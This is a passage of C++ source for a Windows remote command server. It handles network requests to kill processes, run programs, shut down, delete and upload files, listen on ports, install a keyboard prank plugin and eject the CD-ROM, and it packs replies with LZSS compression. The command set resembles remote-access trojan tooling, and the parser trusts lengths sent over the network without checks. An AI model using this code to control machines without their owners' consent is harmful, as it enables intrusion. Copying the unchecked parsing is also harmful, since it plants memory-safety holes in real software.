		case COMMAND_MONITOR_KILL_PROCESS      : return KillProcess();
		case COMMAND_MONITOR_SET_PROC_PRIORITY : return SetPriority();
		case COMMAND_MONITOR_EXEC_PROGRAM      : return ExecuteProgram();   
		case COMMAND_MONITOR_LOGOFF            : return LogOffSystem();
		case COMMAND_MONITOR_SHUTDOWN          : return ShutDownSystem(); 
		case COMMAND_MONITOR_POWER_OFF         : return PowerOffSystem();
		case COMMAND_MONITOR_RESTART           : return RestartSystem();
		case COMMAND_MONITOR_DELETE_FILE       : return DeleteFileFunc(); 
		case COMMAND_MONITOR_CREATE_FOLDER     : return CreateFolderFunc();
		case COMMAND_MONITOR_UPLOADED_FILE     : return SaveUpLoadedFile();  
		case COMMAND_MONITOR_LISTEN_PORT	   : return ListenPort();  
		
		case COMMAND_MONITOR_INSTALL_KEYBOARD_FUN_PLUGIN   : return InstallKeyBrdFunPlugin();
		case COMMAND_MONITOR_UNINSTALL_KEYBOARD_FUN_PLUGIN : return UnInstallKeyBrdFunPlugin();
		case COMMAND_MONITOR_OPEN_CDROM  : return OpenOrCloseCDRom(true);
		case COMMAND_MONITOR_CLOSE_CDROM : return OpenOrCloseCDRom(false);

		case COMMAND_MONITOR_NULL_COMMAND      :
		default:
			return DefaultMessage();
	}
}

UINT32 CCommandMonitorServer::WriteToNetworkByteStream(BYTE* &OutByteStream)
{ 
	ExecuteCommand();
	CommandMonitorNetworkHeader Header;
	CGeneralMemoryUtility::DeleteAll((void**)&OutByteStream);
	if(!AllocateMem((void**)&OutByteStream,sizeof(BYTE)*(sizeof(WinMonitorNetworkServiceHeader)+sizeof(CommandMonitorNetworkHeader)))) return 0;
	switch(COMMAND_MONITOR_GetType(m_uint32TypeAndCompression))
	{
		case COMMAND_MONITOR_GET_LOGICAL_DRIVES:  
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_LOGICAL_DRIVES,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_GET_SUB_DIRS:         
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_SUB_DIRS,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_GET_DRIVE_TYPE:        
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_DRIVE_TYPE,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_GET_DRIVE_INFO:        
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_DRIVE_INFO,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_GET_FILE_ASEXE:        
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_FILE_ASEXE,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_DISPLAY_MSG:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_DISPLAYED_MSG,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_SET_COMPRESSION:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_SET_COMPRESSION_OK ,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_DOWNLOAD_FILE:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_DOWNLOADED_FILE,Header.uint32TypeAndCompression);break;   
		case COMMAND_MONITOR_GET_WINSERVER_NAME:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_WINSERVER_NAME,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_GET_MAIN_MEMORY:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_MAIN_MEMORY,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_GET_COMPUSER_NAME:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_COMPUSER_NAME,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_GET_OS_VERSION:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_OS_VERSION,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_GET_SUB_DIR_NAMES: 
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_SUB_DIR_NAMES,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_GET_PROCESSLIST:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_GOT_PROCESSLIST,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_KILL_PROCESS:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_KILLED_PROCESS,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_SET_PROC_PRIORITY:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_SET_PROC_PRIORITY_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_EXEC_PROGRAM:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_EXECD_PROGRAM,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_LOGOFF:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_LOGOFF_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_SHUTDOWN:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_SHUTDOWN_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_POWER_OFF:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_POWER_OFF_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_RESTART:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_RESTART_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_DELETE_FILE:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_DELETE_FILE_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_CREATE_FOLDER:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_CREATE_FOLDER_OK,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_UPLOADED_FILE:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_FILE_UPLOADED,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_LISTEN_PORT:
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_LISTEN_PORT,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_INSTALL_KEYBOARD_FUN_PLUGIN: 
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_INSTALLED_KEYBOARD_FUN_PLUGIN,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_UNINSTALL_KEYBOARD_FUN_PLUGIN: 
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_UNINSTALLED_KEYBOARD_FUN_PLUGIN,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_OPEN_CDROM: 
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_OPENED_CDROM,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_CLOSE_CDROM: 
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_CLOSED_CDROM,Header.uint32TypeAndCompression);break;   	
		case COMMAND_MONITOR_NULL_COMMAND:
		default: 
			COMMAND_MONITOR_SetType(COMMAND_MONITOR_NULL_COMMAND,Header.uint32TypeAndCompression);
	}

	COMMAND_MONITOR_SetCompression(COMMAND_MONITOR_GetCompression(m_uint32TypeAndCompression),Header.uint32TypeAndCompression);    
	Header.uint32Length=0; 
	BYTE *OutStream=(BYTE*)(OutByteStream+sizeof(WinMonitorNetworkServiceHeader));
	if(!CopyBytes(OutStream,(BYTE*)&Header,sizeof(CommandMonitorNetworkHeader))) return 0;
	if(!m_ulngResultLength) return sizeof(CommandMonitorNetworkHeader); 

	BYTE *DataCompressed=0;
	UINT32 CompressedChars=0;
	bool IsCompress=true;
	try
	{
		switch(COMMAND_MONITOR_GetCompression(m_uint32TypeAndCompression))
		{
			case COMMAND_MONITOR_COMPRESS_LZSS:
					CLzhCompress Compress;
					Compress.lzh_freeze_memory((void*)m_tchrCommandResult,m_ulngResultLength,(void**)&DataCompressed,(int*)&CompressedChars);
					break;
			
			default: 
					CompressedChars=m_ulngResultLength;	DataCompressed=m_tchrCommandResult;
					IsCompress=false;
		}
	}
	catch(...) { return 0; }
	Header.uint32Length=CompressedChars;

	if(!CompressedChars) return 0;
	bool blnOk=false;
	try
	{
		OutByteStream=(BYTE*)ReAllocateMemory((void*)OutByteStream,sizeof(WinMonitorNetworkServiceHeader)+sizeof(CommandMonitorNetworkHeader)+Header.uint32Length);
		OutStream=(BYTE*)(OutByteStream+sizeof(WinMonitorNetworkServiceHeader));
		if(CopyBytes(OutStream,(BYTE*)&Header,sizeof(CommandMonitorNetworkHeader)) &&
			CopyBytes(OutStream+sizeof(CommandMonitorNetworkHeader),DataCompressed,Header.uint32Length)) 
			blnOk=true;
		else blnOk=false;
	}
	catch(...)
	{	blnOk=false; }

	if(IsCompress) CGeneralMemoryUtility::DeleteAll((void**)&DataCompressed);
    else CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);
	
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandArguments);

	if(blnOk) return sizeof(CommandMonitorNetworkHeader)+Header.uint32Length;
	else return 0;
}

UINT32 CCommandMonitorServer::ReadFromNetworkByteStream(BYTE *InByteStream)
{ 
	try
	{
		CommandMonitorNetworkHeader Header;
		m_ulngCommandArgLength=0;
		Header=*((CommandMonitorNetworkHeader*)InByteStream);
		COMMAND_MONITOR_SetType(Header.uint32TypeAndCompression,m_uint32TypeAndCompression);
		if(Header.uint32Length==0) return sizeof(CommandMonitorNetworkHeader);
		TCHAR *CommandArgs=(TCHAR*)(InByteStream+sizeof(CommandMonitorNetworkHeader));
		BYTE *DataDCompressed=0;
		int CharsDCompressed=0;
		try
		{
			switch(COMMAND_MONITOR_GetCompression(Header.uint32TypeAndCompression))
			{
				case COMMAND_MONITOR_COMPRESS_LZSS:
					 switch(COMMAND_MONITOR_GetCompression(Header.uint32TypeAndCompression))
					 {
						case COMMAND_MONITOR_COMPRESS_LZSS:
							CLzhCompress Compress;
							Compress.lzh_melt_memory(CommandArgs,Header.uint32Length,(void**)&DataDCompressed,
												(int*)&CharsDCompressed);
							break;
					 }

					if(!AllocateMem((TCHAR**)&m_tchrCommandArguments,(TCHAR*)DataDCompressed,CharsDCompressed,true)) return 0;
					CGeneralMemoryUtility::DeleteAll((void**)&DataDCompressed);
					m_ulngCommandArgLength=CharsDCompressed;
					break;

				case COMMAND_MONITOR_COMPRESS_NIL:
				default: 
					if(!AllocateMem((TCHAR**)&m_tchrCommandArguments,CommandArgs,Header.uint32Length)) return 0;  
					m_ulngCommandArgLength=Header.uint32Length;
			}
		}catch(...) { return 0; }
		return sizeof(CommandMonitorNetworkHeader)+Header.uint32Length;
	}
	catch(...) { return 0; }
}

CCommandMonitorServer::~CCommandMonitorServer()
{
	//-------Additional Destructions  
}

CCommandMonitorServer::CCommandMonitorServer(UINT32 CommandType,TCHAR *CommandArgs,UINT32 Compression,TCHAR ResultSeperator)
:CCommandMonitorUtility(CommandType,CommandArgs,Compression,ResultSeperator) 	
{
	//-------Additional Constructions
}